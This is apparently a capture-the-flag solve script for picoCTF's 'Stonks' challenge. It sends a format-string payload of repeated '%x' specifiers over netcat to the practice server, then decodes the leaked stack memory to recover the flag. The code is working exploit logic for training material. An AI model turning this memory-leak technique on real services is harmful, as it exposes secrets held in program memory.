#!/usr/bin/env python

import os
import re
import subprocess

from termcolor import colored


def main():
    Stonks('mercury.picoctf.net',  27912).flag()


class Stonks:
    STACK_LEAK_SIZE = 32

    def __init__(self, host: str, port: int) -> None:
        """Initialize."""
        self.host = host
        self.port = port

    def flag(self) -> None:
        """Get the flag."""

        data: bytes = self.nc()

        memory: bytes = self.exctract(data, b"((?<=\n)([0-9a-fA-Z]\|?)+(?=\n))", "stack memory")

        decoded: bytes = self.parse(memory)

        flag: bytes = self.exctract(decoded, b"(picoCTF{\w*})", "flag")

        flag: str = self.decode(flag)

        print(os.environ.get('FLAG_STYLE')
              .replace('\\n', '\n')
              .replace('\\e', '\033')
              .replace('%s', flag), end='')

    def nc(self) -> bytes:
        """Use netcat to connect to the server, and send the exploit."""

        inp = "{}\n{}\n".format(1, ("%x|" * self.STACK_LEAK_SIZE)[:-1]).encode()

        print("\n{}, {}".format(
            colored(f"Call nc {self.host} {self.port}", 'blue', attrs=['bold']),
            colored(inp, 'yellow'),
        ))

        data = subprocess.run(
            ["nc", str(self.host), str(self.port)],
            input=inp,
            capture_output=True
        ).stdout

        print(data)

        return data

    def exctract(self, context: bytes, pattern: bytes, name: str) -> str:
        """Extract pattern from context."""

        print("\n{}, {}".format(
            colored(f"Extract {name}", 'blue', attrs=['bold']),
            colored(pattern, 'yellow'),
        ))

        extracted = re.search(pattern, context).group(1)

        print(extracted)

        return extracted

    def parse(self, memory) -> bytes:
        """Parse the bytes."""

        print("\n{}, {} -> {} -> {} -> {}".format(
            colored("Parse memory bytes", 'blue', attrs=['bold']),
            colored("split(b'|')", 'yellow'),
            colored("decode", 'yellow'),
            colored("reverse", 'yellow'),
            colored("join", 'yellow')
        ))

        def decode(hex: bytes) -> bytes:
            """Decode hex bytes."""
            try:
                return bytes.fromhex(hex.decode())[::-1]
            except ValueError:
                return hex

        decoded = b''.join(map(decode, (byte for byte in memory.split(b'|'))))

        print(decoded)

        return decoded

    def decode(self, flag: bytes) -> str:
        """Decode the flag."""

        print("\n{}".format(
            colored("Decode", 'blue', attrs=['bold']),
        ))

        return flag.decode()


if __name__ == '__main__':
    main()
